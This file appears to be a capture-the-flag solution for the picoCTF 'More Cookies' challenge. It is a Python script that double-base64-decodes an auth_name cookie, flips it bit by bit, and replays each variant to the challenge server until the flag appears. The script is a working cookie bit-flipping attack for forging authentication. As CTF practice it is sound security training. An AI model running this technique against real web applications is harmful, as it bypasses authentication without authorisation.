# More Cookies.md

import requests
from base64 import b64decode, b64encode
import time

Target = "http://mercury.picoctf.net:21553/"

# Create a session object
session = requests.Session()

# Timeout and retry settings
timeout_seconds = 60  # Timeout in seconds
max_retries = 3  # Number of retry attempts
retry_delay = 5  # Delay between retries in seconds

# Headers to mimic a real browser (optional)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}


def fetch_cookie_with_retries(url, session, retries, timeout, delay):
    """Fetch the cookie from the URL with retry logic."""
    for attempt in range(retries):
        try:
            print(f"Attempting to fetch cookie from {url} (Attempt {attempt + 1})")
            response = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
            response.raise_for_status()  # Raises an HTTPError for bad responses

            # Check if the cookie is present in the response
            cookie = response.cookies.get("auth_name")
            if cookie:
                return cookie
            else:
                print("auth_name cookie not found in response.")
                return None

        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                time.sleep(delay)  # Wait before retrying
            else:
                raise  # Reraise the last exception if max retries are exceeded

    return None

try:
    # Fetch the cookie with retries
    Cookie = fetch_cookie_with_retries(Target, session, max_retries, timeout_seconds, retry_delay)

    if Cookie:
        # Base64 decode twice
        Raw_Cookie = b64decode(b64decode(Cookie))

        # Iterate over every single byte in the Raw_Cookie
        for byte_index in range(len(Raw_Cookie)):
            # Iterate over every single bit in the current byte at the position "byte_index" => 1 Byte = 8 bits
            for bit_index in range(8):
                # Create a potential cookie by flipping one bit
                Potential_Raw_Cookie = (Raw_Cookie[:byte_index] +
                                        ((Raw_Cookie[byte_index] ^ (1 << bit_index)).to_bytes(1, 'big')) +
                                        Raw_Cookie[byte_index + 1:])

                # Base64 encode twice the Potential_Raw_Cookie to match the encoding scheme
                Potential_Cookie = b64encode(b64encode(Potential_Raw_Cookie)).decode()

                # Sending a GET request with the Potential_Cookie
                r = requests.get(Target, cookies={"auth_name": Potential_Cookie}, headers=headers)

                # Check if the response contains the flag format "picoCTF{"
                if 'picoCTF{' in r.text:
                    print("\n[*] HERE IS YOUR FLAG: " + r.text.split("<code>")[1].split("</code>")[0])
                    exit()
    else:
        print("auth_name cookie not found!")

except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
